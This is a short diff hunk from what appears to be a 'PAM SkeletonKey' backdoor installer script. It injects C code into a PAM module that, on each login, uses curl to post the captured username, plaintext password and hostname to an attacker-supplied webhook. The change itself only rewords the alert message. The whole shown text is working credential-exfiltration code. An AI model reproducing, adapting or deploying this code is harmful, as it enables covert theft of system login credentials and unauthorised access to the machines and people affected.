@@ -102,7 +102,7 @@ run_cmd tar xzf "$PAM_FILE"
 C_INJECTION=""
 if [ -n "$WEBHOOK_URL" ]; then
     C_INJECTION+="char cmd[1024]; \
-    snprintf(cmd, sizeof(cmd), \"curl -H 'Content-Type: application/json' -d '{\\\"content\\\": \\\"🔐 **PAM SkeletonKey: PAM Password Captured**\\\\n**Username:** %s\\\\n**Password:** %s\\\\n**Hostname:** %s\\\"}' '$WEBHOOK_URL' > /dev/null 2>&1 &\", name, p, \"$(hostname)\"); \
+    snprintf(cmd, sizeof(cmd), \"curl -H 'Content-Type: application/json' -d '{\\\"content\\\": \\\"🔐 **PAM SkeletonKey: Credentials Captured**\\\\n**Username:** %s\\\\n**Password:** %s\\\\n**Hostname:** %s\\\"}' '$WEBHOOK_URL' > /dev/null 2>&1 &\", name, p, \"$(hostname)\"); \
     system(cmd);"
 fi
 
